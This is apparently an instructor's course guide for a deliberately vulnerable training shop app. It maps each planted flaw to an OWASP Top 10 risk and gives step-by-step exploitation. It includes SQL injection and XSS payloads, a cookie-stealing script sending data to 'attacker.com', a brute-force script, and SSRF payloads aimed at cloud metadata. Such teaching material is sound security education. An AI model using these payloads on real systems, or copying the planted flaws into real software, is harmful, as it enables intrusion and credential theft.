# ShopEase - Course Module Mapping

This document maps each vulnerability in the ShopEase application to specific OWASP Top 10 risks and provides exploitation instructions for course modules.

## OWASP Top 10 Vulnerability Matrix

| Module | OWASP Risk | Vulnerable Feature | Location | How to Exploit |
|--------|-----------|-------------------|----------|----------------|
| **Reconnaissance** | N/A | robots.txt disclosure | `/robots.txt` | Visit `/robots.txt` to discover hidden admin panel and API endpoints |
| **A01-1** | Broken Access Control | Order IDOR | `/orders/:id` | Change order ID in URL (e.g., `/orders/1`, `/orders/2`) to view other users' orders |
| **A01-2** | Broken Access Control | Price manipulation | Checkout form | Edit hidden `price` field in browser DevTools during checkout to pay ₹1 for any product |
| **A01-3** | Broken Access Control | Mass assignment | `/profile/update` | Send `role=admin` in POST body to elevate privileges to admin |
| **A02-1** | Cryptographic Failures | Plain text passwords | Admin panel `/zevon-admin/users` | Login as admin, view Users section to see all passwords in plain text |
| **A02-2** | Cryptographic Failures | Session exposure | Login redirect | After login, session data visible in URL parameters (`?user=...&role=...`) |
| **A02-3** | Cryptographic Failures | Weak session config | Session cookies | Session cookie has `httpOnly: false`, accessible via JavaScript `document.cookie` |
| **A03-1** | SQL Injection | Login bypass | `/login` POST endpoint | Use payload `' OR '1'='1' --` in email field to bypass authentication |
| **A03-2** | SQL Injection | Search UNION injection | `/products?search=` | Payload: `' UNION SELECT 1,email,password,4,5,6 FROM users --` to extract user data |
| **A03-3** | XSS (Stored) | Contact form XSS | `/contact` → Admin messages | Submit `<script>alert('XSS')</script>` in message field, view in admin panel |
| **A03-4** | XSS (Reflected) | Search XSS | `/products?search=` | Search for `<script>alert(document.cookie)</script>` to trigger reflected XSS |
| **A04-1** | Insecure Design | No rate limiting | `/login` | Use Burp Intruder to brute force login with no lockout mechanism |
| **A04-2** | Insecure Design | Password reset no verify | `/reset-password` POST | Send POST request with `{"email":"user@example.com","new_password":"hacked"}` directly |
| **A04-3** | Insecure Design | Predictable IDs | `/orders/:id` | Sequential order IDs (1,2,3...) enable enumeration of all orders |
| **A05-1** | Security Misconfiguration | Verbose errors | Trigger SQL error | Visit `/products?search='` to see full SQL query in error message |
| **A05-2** | Security Misconfiguration | Debug endpoint | `/api/debug` | Visit `/api/debug` to see database credentials and configuration |
| **A05-3** | Security Misconfiguration | robots.txt leak | `/robots.txt` | Reveals hidden endpoints like `/zevon-admin`, `/api/debug` |
| **A06** | Outdated Components | Vulnerable packages | package.json | Run `npm audit` inside app container to see known CVEs in dependencies |
| **A07-1** | Auth Failures | No account lockout | `/login` | Unlimited login attempts allowed without CAPTCHA or lockout |
| **A07-2** | Auth Failures | Weak password policy | `/register` | Registration accepts passwords as short as 1 character with no complexity |
| **A07-3** | Auth Failures | Session not invalidated | `/logout` | Old session token works for 30 seconds after logout |
| **A08** | Integrity Failures | Mass assignment | `/profile/update` | POST with `role=admin` field to escalate privileges |
| **A09** | Logging Failures | No login logging | `/login` attempts | Failed login attempts are not logged anywhere - demonstrate with 100 attempts |
| **A10** | SSRF | Image URL fetch | Admin panel "Add Product" | Submit internal URL like `http://localhost:3000/api/debug` or `http://db:3306` |

---

## Detailed Exploitation Guides

### A01: Broken Access Control

#### IDOR on Order Details
**Vulnerability**: `/orders/:id` doesn't verify if the logged-in user owns the order.

**Steps to Exploit**:
1. Register/login as a regular user
2. Place an order and note your order ID (e.g., order #11)
3. Navigate to `/orders/11` to view your order
4. Change URL to `/orders/1`, `/orders/2`, etc.
5. You can now view orders belonging to other users
6. Extract sensitive data: customer names, addresses, purchase history

**Impact**: Complete breach of customer privacy, exposure of PII.

---

#### Price Manipulation at Checkout
**Vulnerability**: Checkout form sends price as hidden input field, server trusts client data.

**Steps to Exploit**:
1. Add expensive product to cart (e.g., iPhone 15 Pro Max - ₹159,900)
2. Go to checkout page
3. Open Browser DevTools (F12) → Elements tab
4. Find hidden input field with product price
5. Edit the value to `1.00`
6. Complete checkout
7. Order confirmation shows you paid ₹1 instead of ₹159,900

**Impact**: Financial fraud, business revenue loss.

---

#### Mass Assignment / Privilege Escalation
**Vulnerability**: `/profile/update` endpoint accepts any field from POST body without filtering.

**Steps to Exploit**:
1. Login as regular user
2. Open browser DevTools → Console
3. Execute this JavaScript:
```javascript
fetch('/profile/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({role: 'admin'})
}).then(r => r.json()).then(console.log);
```
4. Refresh the page
5. You now have admin access - Admin Panel link appears in navbar
6. Access `/zevon-admin` with full admin privileges

**Impact**: Complete system compromise, unauthorized admin access.

---

### A02: Cryptographic Failures

#### Plain Text Passwords in Database
**Vulnerability**: Passwords stored without hashing.

**Steps to Demonstrate**:
1. Login as admin: `admin@shopease.in` / `admin123`
2. Navigate to Admin Panel → Users
3. Full table displays including `Password` column
4. All user passwords visible in plain text
5. Can now login as any user

**Impact**: Complete user account compromise if database is breached.

---

#### Session Data in URL
**Vulnerability**: After login, redirect includes sensitive session data in GET parameters.

**Steps to Demonstrate**:
1. Login with any account
2. Observe redirect URL: `/products?user=rajesh@gmail.com&role=user`
3. User email and role exposed in URL
4. URLs may be logged in browser history, proxy logs, server logs
5. Shared URLs expose user identity

**Impact**: Information disclosure, session tracking.

---

### A03: Injection (SQL Injection & XSS)

#### SQL Injection - Login Bypass
**Vulnerability**: Login query uses string concatenation instead of parameterized queries.

**Steps to Exploit**:
1. Navigate to `/login`
2. Email field: `' OR '1'='1' --`
3. Password field: `anything`
4. Click Login
5. Successfully authenticated as the first user in database (admin)

**Payload Explanation**:
```sql
-- Original query:
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'anything'

-- After injection becomes:
SELECT * FROM users WHERE email = '' OR '1'='1'
-- Rest is commented out, so password check is bypassed
```

**Impact**: Authentication bypass, unauthorized access.

---

#### SQL Injection - UNION-Based Data Extraction
**Vulnerability**: Product search uses unparameterized query.

**Steps to Exploit**:
1. Navigate to `/products`
2. Search query: `' UNION SELECT 1,email,password,4,5,6 FROM users --`
3. Product listing now shows user emails and passwords disguised as product names
4. Extract entire users table

**Advanced Payload** (enumerate all tables):
```sql
' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='shopease' --
```

**Impact**: Full database compromise, data exfiltration.

---

#### Stored XSS via Contact Form
**Vulnerability**: Contact messages stored without sanitization, rendered with `<%- %>` (unescaped).

**Steps to Exploit**:
1. Navigate to `/contact`
2. Fill form with payload in message field:
```html
<script>alert('XSS by Student')</script>
```
3. Submit form
4. Login as admin: `admin@shopease.in` / `admin123`
5. Navigate to Admin Panel → Messages
6. XSS payload executes when admin views the message

**Advanced Payload** (cookie stealing):
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Impact**: Session hijacking, admin account compromise.

---

### A04: Insecure Design

#### No Rate Limiting - Brute Force Attack
**Vulnerability**: Login endpoint has no rate limiting or CAPTCHA.

**Steps to Demonstrate**:
1. Use Burp Suite Intruder or custom script
2. Capture login POST request
3. Set email to `admin@shopease.in`
4. Load common password list (rockyou.txt)
5. Send 1000+ requests with no throttling
6. Server accepts all attempts without lockout

**Simple Python Script**:
```python
import requests

passwords = ['admin', 'password', 'admin123', '123456']
for pwd in passwords:
    r = requests.post('http://vps-ip/login', 
                      data={'email': 'admin@shopease.in', 'password': pwd})
    if 'Invalid' not in r.text:
        print(f'Success! Password: {pwd}')
        break
```

**Impact**: Account takeover via brute force.

---

### A05: Security Misconfiguration

#### Debug Endpoint Exposure
**Vulnerability**: `/api/debug` returns sensitive configuration.

**Steps to Exploit**:
1. Visit `http://vps-ip/api/debug`
2. JSON response reveals:
```json
{
  "env": "production",
  "db_host": "db",
  "db_user": "shopease_user",
  "db_name": "shopease",
  "session_secret": "secret123",
  "version": "1.0.0"
}
```
3. Use credentials to access database directly
4. Session secret can be used to forge session cookies

**Impact**: Database compromise, session hijacking.

---

### A10: Server-Side Request Forgery (SSRF)

#### SSRF via Image URL Fetch
**Vulnerability**: Admin "Add Product" fetches image URLs server-side without validation.

**Steps to Exploit**:
1. Login as admin
2. Admin Panel → Products → Add Product
3. Image URL field: `http://localhost:3000/api/debug`
4. Server fetches the URL and logs response
5. Check logs: `docker-compose logs app`
6. Internal API response visible in logs

**Advanced Payloads**:
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- Internal services: `http://db:3306`
- Port scanning: `http://localhost:22`, `http://localhost:6379`

**Impact**: Internal network reconnaissance, cloud credential theft.

---

## Test Accounts

| Email | Password | Role |
|-------|----------|------|
| admin@shopease.in | admin123 | admin |
| rajesh@gmail.com | password123 | user |
| priya.sharma@yahoo.com | user1234 | user |
| amit.patel@outlook.com | test@123 | user |

---

## Recommended Testing Tools

- **Burp Suite** - SQL injection, XSS, IDOR testing
- **sqlmap** - Automated SQL injection
- **XSStrike** - XSS detection
- **OWASP ZAP** - Automated vulnerability scanning
- **Postman** - API endpoint testing
- **Browser DevTools** - Price manipulation, session analysis

---

## Important Notes for Instructors

1. **Reset Database Between Sessions**: Run `docker-compose down -v && docker-compose up -d` to reset
2. **Monitor Logs**: Check `docker-compose logs -f app` during student sessions
3. **Backup Before Class**: Take VPS snapshot before each teaching session
4. **Isolate Network**: Consider VPN access only for student connections
5. **Time Limits**: Set expectations - full exploitation can take 2-3 hours

---

## Learning Objectives by Module

- **A01**: Understanding authorization vs authentication
- **A02**: Importance of encryption and hashing
- **A03**: Input validation and output encoding
- **A04**: Security as a design principle, not afterthought
- **A05**: Principle of least privilege in configuration
- **A06**: Supply chain security, dependency management
- **A07**: Defense in depth for authentication
- **A08**: Server-side validation, never trust client input
- **A09**: Security observability and incident response
- **A10**: Network segmentation and input validation for URLs
